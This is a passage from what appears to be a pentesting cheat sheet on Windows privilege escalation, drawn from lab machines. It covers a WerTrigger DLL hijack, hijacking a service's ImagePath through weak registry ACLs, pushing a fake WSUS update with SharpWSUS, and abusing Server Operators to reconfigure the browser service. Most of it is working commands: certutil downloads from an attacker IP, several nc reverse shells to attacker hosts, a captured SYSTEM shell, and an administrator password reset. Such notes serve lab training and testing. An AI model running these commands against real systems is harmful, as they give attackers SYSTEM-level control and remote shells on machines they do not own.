c:\temp>certutil -urlcache -f http://192.168.45.5/Report.wer Report.wer
****  Online  ****
CertUtil: -URLCache command completed successfully.

c:\temp>certutil -urlcache -f http://192.168.45.5/phoneinfo.dll phoneinfo.dll
****  Online  ****
CertUtil: -URLCache command completed successfully.

MariaDB [(none)]> select load_file('C:\\temp\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
Query OK, 1 row affected (0.254 sec)

#After running WerTrigger.exe, we won't receive any prompt but we can still enter commands to execute.
c:\temp>WerTrigger.exe
c:\temp\nc.exe -e cmd.exe 192.168.45.5 445
```

```bash
┌──(root㉿kali)-[/home/kali/Documents/pg_practice/craft2]
└─# nc -lvp 445
listening on [any] 445 ...
connect to [192.168.45.5] from craft.offsec [192.168.159.188] 49770
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

</details>

<details>

<summary>Abuse Service Registry ACLs</summary>

```powershell
# Check the permissions of HKLM:\SYSTEM\CurrentControlSet\Services subkey
$acl = Get-ACL -Path HKLM:\SYSTEM\CurrentControlSet\Services
ConvertFrom-SddlString -Sddl $acl.Sddl | Foreach-Object {$_.DiscretionaryAcl}
```

<figure><img src="../.gitbook/assets/image (353).png" alt=""><figcaption><p>User "Hector" has full control over the HKLM:\SYSTEM\CurrentControlSet\Services subkey</p></figcaption></figure>

Exploit using a service that's running as NT AUTHORITY\SYSTEM that we have permissions to start --> wuauserv or seclogon

<figure><img src="../.gitbook/assets/image (354).png" alt=""><figcaption></figcaption></figure>

```powershell
Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\wuauserv -name ImagePath -value "c:\temp\nc.exe -e powershell.exe 10.10.14.13 443"
sc.exe start wuauserv
```

```
nc -lvp 443
```

<figure><img src="../.gitbook/assets/image (355).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>WSUS Administrators</summary>

Use [https://github.com/nettitude/SharpWSUS](https://github.com/nettitude/SharpWSUS)

To provide updates to internal servers without direct internet connection

Must use Microsoft signed binaries only!

```
.\SharpWSUS.exe create /payload:"C:\temp\psexec_64.exe" /args:" -accepteula -s -d c:\temp\nc64.exe -e cmd.exe 10.10.14.4 443" /title:"CVE-2022-30190"

.\SharpWSUS.exe approve /updateid:<ID> /computername:dc.outdated.htb /groupname:"CriticalPatches"
```

<figure><img src="../.gitbook/assets/image (356).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Abusing Server Operators Group Membership</summary>

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

Server operators group allows members to start, stop and change properties of the browser (Computer Browser) service

```powershell
sc.exe stop browser
sc.exe config browser binpath="C:\Windows\System32\cmd.exe /c net user administrator P@ssw0rd123!"
sc.exe qc browser
sc.exe start browser

impacket-psexec administrator@10.10.10.179
```

</details>
